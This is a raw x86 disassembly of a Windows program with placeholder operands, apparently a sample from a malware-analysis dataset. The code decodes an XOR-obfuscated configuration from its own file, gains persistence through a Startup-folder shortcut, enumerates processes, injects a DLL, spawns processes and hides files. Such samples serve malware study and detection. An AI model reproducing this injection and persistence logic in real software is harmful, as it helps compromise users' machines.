sub_401062
push ecx
mov al [ esp + 0x3 ]
push esi
push edi
mov edi rw-data
push 0x0
mov ecx edi
mov [ rw-data ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov esi rw-data
push esi
call strlen
pop ecx
push eax
push esi
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
pop edi
pop esi
pop ecx
retn
sub_4010b1
push ebp
mov ebp esp
sub esp 0x14
push ebx
push 0x1388
call [ Sleep@IAT ]
push rw-data
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
mov [ rw-data ] eax
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
push 0x104
call [ GetTempPathA@IAT ]
push esi
push [ std::cout@IAT ]
call [ std::operator<<@IAT ]
push eax
call [ std::endl@IAT ]
add esp 0xc
push esi
push rw-data
push rw-data
call [ sprintf@IAT ]
lea eax [ ebp - 0x14 ]
push eax
call sub_40123d
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
add esp 0x10
mov ebx rw-data
push [ ecx ]
mov ecx ebx
push 0x0
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
push 0x1
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov edi rw-data
push rw-data
push edi
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
push [ rw-data ]
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
push rw-data
push [ std::cout@IAT ]
call [ std::operator<<@IAT ]
push eax
call [ std::endl@IAT ]
add esp 0xc
xor eax eax
pop edi
pop esi
push rw-data
lea eax [ ebp - 0x14 ]
push edi
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
add esp 0xc
push [ ecx ]
mov ecx ebx
push 0x0
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
push 0x1
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
push edi
push [ std::cout@IAT ]
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
push eax
call [ std::endl@IAT ]
mov eax [ rw-data ]
xor edi edi
add esp 0xc
cmp eax edi
jne r-xdata
pop ebx
leave
retn 0x10
push eax
push rw-data
push rw-data
call [ sprintf@IAT ]
push esi
call sub_4016f8
add esp 0x10
call sub_401422
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push edi
push edi
push sub_4015f4
push edi
push edi
call [ CreateThread@IAT ]
mov [ rw-data ] eax
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
sub_40123d
push ebp
mov ebp esp
sub esp 0x20c
push esi
push edi
mov esi 0x104
xor edi edi
push esi
lea eax [ ebp - 0x20c ]
push edi
push eax
mov [ ebp - 0x4 ] edi
call memset
push esi
lea eax [ ebp - 0x108 ]
push edi
push eax
call memset
add esp 0x18
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push 0x7
push edi
call [ SHGetSpecialFolderLocation@IAT ]
cmp [ ebp - 0x4 ] edi
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ sprintf@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x108 ]
push eax
push [ ebp - 0x4 ]
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
push esi
push eax
lea eax [ ebp - 0x108 ]
push eax
call [ GetShortPathNameA@IAT ]
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov al [ ebp + 0xb ]
push edi
mov ecx esi
mov [ esi ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
lea eax [ ebp - 0x108 ]
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x108 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov eax esi
pop edi
pop esi
leave
retn
sub_4012f9
push ebp
mov ebp esp
sub esp 0x210
push esi
push 0x0
call [ CoInitialize@IAT ]
mov esi [ Sleep@IAT ]
push 0x64
call esi
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
push 0x352
push eax
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jge r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x210 ]
push 0x104
push eax
push 0xffffffff
push [ ebp + 0xc ]
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
push 0x64
call esi
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x210 ]
push 0x1
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
push rw-data
push [ std::cout@IAT ]
call [ std::operator<<@IAT ]
push eax
call [ std::endl@IAT ]
mov eax [ ebp - 0x8 ]
add esp 0xc
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
call [ CoUninitialize@IAT ]
push 0x1
pop eax
sub_4013ce
push ebp
mov ebp esp
sub esp 0x24
push esi
xor esi esi
push 0x24
lea eax [ ebp - 0x24 ]
push esi
push eax
call memset
add esp 0xc
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax esi
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call [ GetSystemInfo@IAT ]
lea ecx [ ebp - 0x24 ]
push ecx
call eax
jmp r-xdata
mov eax esi
pop esi
leave
retn
push 0x1
pop esi
cmp [ ebp - 0x24 ] 0x9
jne r-xdata
sub_401422
push ebp
mov ebp esp
sub esp 0x364
push ebx
push esi
push edi
mov ebx [ sprintf@IAT ]
push 0x10
xor eax eax
pop ecx
lea edi [ ebp - 0x54 ]
[ edi ]
lea eax [ ebp - 0x364 ]
xor edi edi
push rw-data
push eax
mov [ ebp - 0x58 ] 0x44
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x28 ] di
call ebx
mov esi 0x104
lea eax [ ebp - 0x260 ]
push esi
push edi
push eax
call memset
add esp 0x14
lea eax [ ebp - 0x260 ]
push esi
push eax
call [ GetWindowsDirectoryA@IAT ]
push 0x4
lea eax [ ebp - 0x4 ]
push edi
push eax
call memset
lea eax [ ebp - 0x260 ]
push 0x3
push eax
lea eax [ ebp - 0x4 ]
push eax
call [ strncpy@IAT ]
push esi
lea eax [ ebp - 0x15c ]
push edi
push eax
call memset
add esp 0x24
call sub_4013ce
test eax eax
lea eax [ ebp - 0x4 ]
push eax
je r-xdata
push rw-data
push rw-data
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
push 0x1388
mov [ rw-data ] eax
call [ Sleep@IAT ]
push [ ebp - 0x8 ]
push edi
call sub_4016c5
mov esi [ CloseHandle@IAT ]
pop ecx
pop ecx
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x14 ]
call esi
push 0x1
pop eax
lea eax [ ebp - 0x15c ]
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x15c ]
push eax
push [ std::cout@IAT ]
call [ std::operator<<@IAT ]
push eax
call [ std::endl@IAT ]
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push edi
push edi
push edi
push edi
push edi
lea eax [ ebp - 0x364 ]
push edi
push eax
lea eax [ ebp - 0x15c ]
push eax
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
sub_401552
push ebp
mov ebp esp
sub esp 0x128
and [ ebp - 0x128 ] 0x0
push esi
push edi
push 0x49
pop ecx
xor eax eax
lea edi [ ebp - 0x124 ]
push rw-data
[ edi ]
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push 0x0
push 0x2
call eax
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseHandle@IAT ]
xor eax eax
lea eax [ ebp - 0x128 ]
mov [ ebp - 0x128 ] 0x128
push eax
push esi
call Process32First
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32Next
jmp r-xdata
mov eax [ ebp - 0x120 ]
cmp eax [ rw-data ]
je r-xdata
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
leave
retn
sub_4015f4
sub esp 0x140
push ebx
mov ebx [ Sleep@IAT ]
push ebp
mov ebp [ SetFileAttributesA@IAT ]
push esi
push edi
mov esi rw-data
mov edi rw-data
lea eax [ esp + 0x10 ]
push eax
push esi
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
push rw-data
call sub_4016f8
test eax eax
pop ecx
jne r-xdata
push 0xea60
push esi
push edi
call sub_4012f9
mov eax [ rw-data ]
pop ecx
test eax eax
pop ecx
jne r-xdata
call [ UnmapDll@IAT ]
mov eax [ g_bSubclassed@IAT ]
and [ eax ] 0x0
call sub_401422
test eax eax
jne r-xdata
push 0x2710
jmp r-xdata
push rw-data
call sub_401552
test eax eax
pop ecx
jne r-xdata
push 0x2
push eax
call ebp
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
push esi
push edi
call sub_4012f9
mov eax [ rw-data ]
pop ecx
test eax eax
pop ecx
jne r-xdata
push rw-data
push [ std::cout@IAT ]
call [ std::operator<<@IAT ]
push eax
call [ std::endl@IAT ]
add esp 0xc
jmp r-xdata
call ebx
jmp r-xdata
push 0x2
push eax
call ebp
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
sub_4016d6
xor edx edx
cmp [ esp + 0x8 ] edx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
lea ecx [ edx + eax ]
mov al [ edx + eax ]
test al al
je r-xdata
inc edx
cmp edx [ esp + 0x8 ]
jl r-xdata
xor al 0x3e
mov [ ecx ] al
sub_4016f8
push ebp
mov ebp esp
sub esp 0x42c
push ebx
mov ebx [ sprintf@IAT ]
push esi
push edi
push rw-data
lea eax [ ebp - 0x1a4 ]
xor esi esi
push rw-data
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x1c ] esi
call ebx
add esp 0xc
mov edi 0x80
lea eax [ ebp - 0x1a4 ]
push esi
push edi
push 0x2
push esi
push 0x3
push 0xc0000000
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
push eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x42c ]
push 0x104
push eax
push esi
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x42c ]
push rw-data
push eax
call [ fopen@IAT ]
pop ecx
cmp eax esi
pop ecx
mov [ ebp - 0x4 ] eax
je r-xdata
push edi
lea eax [ ebp - 0x224 ]
push esi
push eax
call memset
push esi
mov esi [ fseek@IAT ]
push 0x2b0
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x224 ]
push edi
mov edi [ fread@IAT ]
push 0x1
push eax
call edi
lea eax [ ebp - 0x224 ]
push 0x80
push eax
call sub_4016d6
lea eax [ ebp - 0x224 ]
push eax
call strlen
add esp 0x34
test eax eax
jbe r-xdata
push 0x104
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x224 ]
push eax
lea eax [ ebp - 0x328 ]
push rw-data
push eax
call ebx
push 0x0
push 0x330
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x18 ]
push 0x2
push 0x1
push eax
call edi
add esp 0x28
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
push 0x0
push 0x332
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x2
push 0x1
push eax
call edi
add esp 0x1c
cmp [ ebp - 0xc ] 0x0
jl r-xdata
push 0x0
push 0x334
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push 0x1
push 0x1
push eax
call edi
add esp 0x1c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push 0x0
push 0x399
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x20 ]
push 0x1
push 0x1
push eax
call edi
add esp 0x1c
mov esi [ WritePrivateProfileStringA@IAT ]
lea eax [ ebp - 0x1a4 ]
mov edi rw-data
push eax
lea eax [ ebp - 0x328 ]
push eax
push rw-data
push edi
call esi
push 0x4
lea eax [ ebp - 0x8 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x8 ]
push [ ebp - 0x18 ]
push rw-data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push edi
call esi
push 0x4
lea eax [ ebp - 0x8 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x8 ]
push [ ebp - 0xc ]
push rw-data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push edi
call esi
cmp [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x1a4 ]
push eax
je r-xdata
push 0x20
lea eax [ ebp - 0x40 ]
push 0x0
push eax
call memset
push 0x0
push 0x335
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x40 ]
push 0x20
push 0x1
push eax
call edi
lea eax [ ebp - 0x40 ]
push 0x20
push eax
call sub_4016d6
lea eax [ ebp - 0x40 ]
push eax
call strlen
add esp 0x34
test eax eax
jbe r-xdata
push rw-data
push rw-data
push rw-data
push rw-data
mov edi rw-data
push rw-data
push edi
call esi
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push rw-data
push edi
call esi
push 0x4
lea eax [ ebp - 0x8 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x8 ]
push [ ebp - 0x14 ]
push rw-data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push edi
call esi
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0xa0 ]
push eax
push rw-data
push edi
call esi
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
push rw-data
push edi
call esi
push 0x4
lea eax [ ebp - 0x8 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x8 ]
push [ ebp - 0x1c ]
push rw-data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push edi
jmp r-xdata
push 0x20
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x80 ]
push rw-data
push eax
call ebx
push 0x0
push 0x355
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x14 ]
push 0x2
push 0x1
push eax
call edi
add esp 0x28
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
push rw-data
push rw-data
jmp r-xdata
call esi
cmp [ ebp - 0x20 ] 0x0
lea eax [ ebp - 0x1a4 ]
push eax
je r-xdata
push 0x20
lea eax [ ebp - 0x40 ]
push 0x0
push eax
call memset
push 0x0
push 0x357
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x40 ]
push 0x20
push 0x1
push eax
call edi
lea eax [ ebp - 0x40 ]
push 0x20
push eax
call sub_4016d6
push 0x20
lea eax [ ebp - 0xa0 ]
push 0x0
push eax
call memset
add esp 0x3c
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0xa0 ]
push rw-data
push eax
call ebx
push 0x20
lea eax [ ebp - 0x40 ]
push 0x0
push eax
call memset
push 0x0
push 0x377
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x40 ]
push 0x20
push 0x1
push eax
call edi
lea eax [ ebp - 0x40 ]
push 0x20
push eax
call sub_4016d6
push 0x20
lea eax [ ebp - 0x60 ]
push 0x0
push eax
call memset
add esp 0x48
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x60 ]
push rw-data
push eax
call ebx
push 0x0
push 0x397
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x1c ]
push 0x2
push 0x1
push eax
call edi
add esp 0x28
cmp [ ebp - 0x1c ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
push rw-data
push rw-data
call esi
push 0x1
pop eax
jmp r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401d79
cmp [ rw-data ] ebx
jne r-xdata
call sub_401d64
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401d76
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4010b1
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401000
call ??0Init@ios_base@std@@QAE@XZ
jmp sub_401015
??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_401015
push ??1Init@ios_base@std@@QAE@XZ
call sub_401bd6
pop ecx
retn
??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_40102c
call ??0_Winit@std@@QAE@XZ
jmp sub_401041
??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_401041
push ??1_Winit@std@@QAE@XZ
call sub_401bd6
pop ecx
retn
??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
sub_401058
call sub_401062
jmp sub_401097
sub_401097
push sub_4010a3
call sub_401bd6
pop ecx
retn
sub_4010a3
push 0x1
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
retn
sub_4016c5
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call [ InjectDll@IAT ]
pop ecx
pop ecx
retn
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
jmp [ std::operator<<@IAT ]
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
jmp [ std::operator&@IAT ]
sub_401baa
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_401bd6
push [ esp + 0x4 ]
call sub_401baa
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
strlen
jmp [ strlen@IAT ]
memset
jmp [ memset@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401d64
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401d76
xor eax eax
retn
sub_401d79
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
